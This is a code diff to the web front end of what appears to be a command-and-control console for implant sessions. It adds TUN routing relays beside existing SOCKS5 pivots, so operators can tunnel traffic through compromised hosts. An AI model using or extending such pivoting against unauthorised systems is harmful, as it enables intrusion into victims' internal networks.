@@ -33,6 +33,8 @@ const state = {
   sessionDownloads: [],
   socksRelays: [],
   socksBusy: false,
+  tunRelays: [],
+  tunBusy: false,
   /** Commands echoed locally; skip duplicate operator lines from server. */
   echoedCommands: new Set(),
   /** Pending command blocks for queued result placement (tech plan §6). */
@@ -184,6 +186,7 @@ async function retryServerConnection() {
     }
     await refreshExfilStatus();
     await refreshSocksRelays();
+    await refreshTunRelays();
   } finally {
     if (btn) btn.disabled = false;
   }
@@ -394,6 +397,210 @@ async function fetchSessionDownloads() {
 function selectedSocksRelay(sessionId = state.selectedId) {
   if (!sessionId) return null;
   return state.socksRelays.find((relay) => relay.session_id === sessionId) || null;
+}
+
+function selectedTunRelay(sessionId = state.selectedId) {
+  if (!sessionId) return null;
+  return state.tunRelays.find((relay) => relay.session_id === sessionId) || null;
+}
+
+function setTunActionStatus(message, error = false) {
+  const el = $("#tun-action-status");
+  if (!el) return;
+  el.textContent = message || "";
+  el.classList.toggle("tun-action-error", Boolean(error));
+}
+
+function renderTunRelayList() {
+  const container = $("#tun-relays-list");
+  if (!container) return;
+  if (!state.tunRelays.length) {
+    container.innerHTML = '<p class="downloads-empty">No active TUN relays.</p>';
+    return;
+  }
+
+  const rows = state.tunRelays
+    .map((relay) => {
+      const sessionId = String(relay.session_id || "");
+      const route = String(relay.route || "").trim() || "no target route";
+      const device = String(relay.device || "?");
+      const address = String(relay.tun_address || "?");
+      const helper = relay.helper_alive ? "helper running" : "helper stopped";
+      const beacon = String(relay.beacon_status || "unknown");
+      const agent = socksAgentLabel(relay);
+      return `<tr>
+        <td>${escapeHtml(agent)}<br><span class="tun-relay-id">${escapeHtml(sessionId.slice(0, 8))}</span></td>
+        <td><code>${escapeHtml(device)}</code><br><span class="tun-relay-id">${escapeHtml(address)} → ${escapeHtml(route)}</span></td>
+        <td>${escapeHtml(helper)} · ${escapeHtml(beacon)}</td>
+        <td><div class="tun-relay-actions"><button type="button" class="danger tun-stop-relay" data-session-id="${escapeHtml(sessionId)}"${state.tunBusy ? " disabled" : ""}>Stop</button></div></td>
+      </tr>`;
+    })
+    .join("");
+
+  container.innerHTML = `<table class="socks-table tun-table">
+    <caption class="sr-only">Active server TUN relays</caption>
+    <thead><tr><th scope="col">Agent</th><th scope="col">Device and route</th><th scope="col">Status</th><th scope="col">Actions</th></tr></thead>
+    <tbody>${rows}</tbody>
+  </table>`;
+
+  container.querySelectorAll(".tun-stop-relay").forEach((button) => {
+    button.addEventListener("click", () => {
+      const sessionId = button.dataset.sessionId || "";
+      stopTunRelay(sessionId).catch((err) => setTunActionStatus(err.message || String(err), true));
+    });
+  });
+}
+
+function updateTunUi() {
+  const selectedLabel = $("#tun-selected-session");
+  const status = $("#tun-status");
+  const start = $("#tun-start");
+  const stop = $("#tun-stop");
+  const relay = selectedTunRelay();
+  const session = state.sessions.find((item) => item.id === state.selectedId);
+
+  if (selectedLabel) {
+    selectedLabel.textContent = session
+      ? `Selected session: ${session.username}@${session.hostname} · ${session.id.slice(0, 8)}`
+      : "No live session selected";
+  }
+  if (status) {
+    if (relay) {
+      const route = relay.route || "no target route";
+      const helper = relay.helper_alive ? "helper running" : "helper stopped";
+      status.textContent = `Active server TUN · ${relay.device} · route ${route} · ${helper}`;
+      status.classList.add("tun-active");
+    } else {
+      status.textContent = state.selectedId
+        ? "No server TUN routing for the selected session."
+        : "Select a live session to configure TUN routing.";
+      status.classList.remove("tun-active");
+    }
+  }
+  if (start) {
+    start.disabled = state.tunBusy || !state.selectedId || state.viewMode !== "live" || Boolean(relay);
+    start.textContent = relay ? "Stop current relay before reconfiguring" : "Start TUN routing";
+  }
+  if (stop) {
+    stop.disabled = state.tunBusy || !relay || state.viewMode !== "live";
+  }
+  renderTunRelayList();
+  renderSessionList();
+}
+
+async function refreshTunRelays() {
+  if (!state.token) return;
+  const { status, data } = await api("/tun");
+  if (status === 401) {
+    disconnect();
+    return;
+  }
+  if (status !== 200) return;
+  state.tunRelays = Array.isArray(data.relays) ? data.relays : [];
+  updateTunUi();
+}
+
+function openTunDialog() {
+  if (!state.selectedId || state.viewMode !== "live") return;
+  const relay = selectedTunRelay();
+  const values = {
+    "#tun-device": relay?.device || "tun://rmm0",
+    "#tun-route": relay?.route || "",
+    "#tun-address": relay?.tun_address || "198.18.0.1/15",
+    "#tun-interface": relay?.interface || "",
+    "#tun-mtu": relay?.mtu || 1500,
+    "#tun-udp-timeout": relay?.udp_timeout_seconds || 300,
+  };
+  for (const [selector, value] of Object.entries(values)) {
+    const input = $(selector);
+    if (input) input.value = String(value);
+  }
+  setTunActionStatus("");
+  updateTunUi();
+  const dialog = $("#tun-dialog");
+  if (dialog?.showModal && !dialog.open) dialog.showModal();
+  refreshTunRelays().catch(() => {});
+}
+
+async function startSelectedTun() {
+  const sessionId = state.selectedId;
+  if (!sessionId || state.viewMode !== "live") return;
+  const device = $("#tun-device")?.value.trim() || "";
+  const route = $("#tun-route")?.value.trim() || "";
+  const tunAddress = $("#tun-address")?.value.trim() || "198.18.0.1/15";
+  const interfaceName = $("#tun-interface")?.value.trim() || "";
+  const mtu = Number.parseInt($("#tun-mtu")?.value, 10);
+  const udpTimeout = Number.parseInt($("#tun-udp-timeout")?.value, 10);
+  if (!device) {
+    setTunActionStatus("TUN device is required.", true);
+    return;
+  }
+  if (!Number.isInteger(mtu) || mtu < 576 || mtu > 9000) {
+    setTunActionStatus("MTU must be between 576 and 9000.", true);
+    return;
+  }
+  if (!Number.isInteger(udpTimeout) || udpTimeout < 1 || udpTimeout > 86400) {
+    setTunActionStatus("UDP idle timeout must be between 1 and 86400 seconds.", true);
+    return;
+  }
+  state.tunBusy = true;
+  updateTunUi();
+  setTunActionStatus("Starting server TUN routing…");
+  try {
+    const { status, data } = await api(`/sessions/${encodeURIComponent(sessionId)}/tun`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        device,
+        route,
+        tun_address: tunAddress,
+        interface: interfaceName,
+        mtu,
+        udp_timeout_seconds: udpTimeout,
+      }),
+    });
+    if (status !== 200) {
+      setTunActionStatus(data.detail || data.error || `TUN start failed (HTTP ${status})`, true);
+      return;
+    }
+    const relay = data.tun || {};
+    const activeDevice = relay.device || device;
+    const activeRoute = relay.route || route || "no target route";
+    setTunActionStatus(`TUN routing active on ${activeDevice} · route ${activeRoute}`);
+    appendShellMeta(`Server TUN routing enabled on ${activeDevice} · route ${activeRoute}`);
+    await refreshTunRelays();
+    await refreshSocksRelays();
+  } finally {
+    state.tunBusy = false;
+    updateTunUi();
+  }
+}
+
+async function stopTunRelay(sessionId = state.selectedId) {
+  if (!sessionId) return;
+  state.tunBusy = true;
+  updateTunUi();
+  setTunActionStatus("Stopping server TUN routing…");
+  try {
+    const { status, data } = await api(`/sessions/${encodeURIComponent(sessionId)}/tun`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ stop: true }),
+    });
+    if (status !== 200) {
+      setTunActionStatus(data.detail || data.error || `TUN stop failed (HTTP ${status})`, true);
+      return;
+    }
+    if (sessionId === state.selectedId) {
+      appendShellMeta("Server TUN routing stopped");
+    }
+    setTunActionStatus("Server TUN routing stopped");
+    await refreshTunRelays();
+    await refreshSocksRelays();
+  } finally {
+    state.tunBusy = false;
+    updateTunUi();
+  }
 }
 
 function socksAgentLabel(relay) {
@@ -691,6 +898,7 @@ function startSessionPolling() {
     refreshSessions().catch(() => {});
     fetchSessionHistory().catch(() => {});
     refreshSocksRelays().catch(() => {});
+    refreshTunRelays().catch(() => {});
   };
   tick();
   state.sessionPollTimer = setInterval(tick, 5000);
@@ -2060,6 +2268,7 @@ async function connect() {
   }
   await refreshExfilStatus();
   await refreshSocksRelays();
+  await refreshTunRelays();
 }
 
 function disconnect() {
@@ -2074,6 +2283,8 @@ function disconnect() {
   state.selectedId = null;
   state.socksRelays = [];
   state.socksBusy = false;
+  state.tunRelays = [];
+  state.tunBusy = false;
   state.echoedCommands.clear();
   showLogin();
 }
@@ -2104,11 +2315,15 @@ function renderSessionList() {
     const socksMeta = relay
       ? `<span class="socks-session-status">Pivot SOCKS5 ${escapeHtml(String(relay.port))}</span>`
       : "";
+    const tunRelay = selectedTunRelay(s.id);
+    const tunMeta = tunRelay
+      ? `<span class="tun-session-status">TUN ${escapeHtml(String(tunRelay.device || "active"))}</span>`
+      : "";
     li.innerHTML = `
       <div class="id">${escapeHtml(s.id.slice(0, 8))} <span class="beacon-status ${statusClass(st)}">${escapeHtml(st)}</span></div>
       <div class="meta">${escapeHtml(s.username)}@${escapeHtml(s.hostname)}</div>
       ${connected ? `<div class="sub sub-connected">connected ${escapeHtml(connected)}</div>` : ""}
-      <div class="sub">sleep ${s.sleep_seconds}s · jitter ${s.jitter_percent}% · ${escapeHtml(ago)} ${socksMeta}</div>
+      <div class="sub">sleep ${s.sleep_seconds}s · jitter ${s.jitter_percent}% · ${escapeHtml(ago)} ${socksMeta}${tunMeta}</div>
     `;
 
     const actions = document.createElement("div");
@@ -2199,6 +2414,7 @@ async function selectSession(id) {
   }
   await fetchSessionDownloads();
   await refreshSocksRelays();
+  await refreshTunRelays();
 }
 
 function showEmptyConsole() {
@@ -2220,6 +2436,7 @@ function showEmptyConsole() {
     dl.innerHTML = '<p class="downloads-empty">No files downloaded yet.</p>';
   }
   updateSocksUi();
+  updateTunUi();
   renderSessionList();
   renderHistoryList();
   updateShellPrompt();
@@ -2926,6 +3143,7 @@ document.addEventListener("DOMContentLoaded", () => {
     if (dialog?.showModal && !dialog.open) dialog.showModal();
   });
   $("#open-socks-dialog")?.addEventListener("click", openSocksDialog);
+  $("#open-tun-dialog")?.addEventListener("click", openTunDialog);
   $("#socks-start")?.addEventListener("click", () => {
     startSelectedSocks().catch((err) => setSocksActionStatus(err.message || String(err), true));
   });
@@ -2937,6 +3155,18 @@ document.addEventListener("DOMContentLoaded", () => {
     refreshSocksRelays()
       .then(() => setSocksActionStatus("Relay list refreshed"))
       .catch((err) => setSocksActionStatus(err.message || String(err), true));
+  });
+  $("#tun-start")?.addEventListener("click", () => {
+    startSelectedTun().catch((err) => setTunActionStatus(err.message || String(err), true));
+  });
+  $("#tun-stop")?.addEventListener("click", () => {
+    stopTunRelay().catch((err) => setTunActionStatus(err.message || String(err), true));
+  });
+  $("#tun-refresh")?.addEventListener("click", () => {
+    setTunActionStatus("Refreshing TUN relay list…");
+    refreshTunRelays()
+      .then(() => setTunActionStatus("TUN relay list refreshed"))
+      .catch((err) => setTunActionStatus(err.message || String(err), true));
   });
   $("#history-clear-all")?.addEventListener("click", (e) => {
     e.preventDefault();
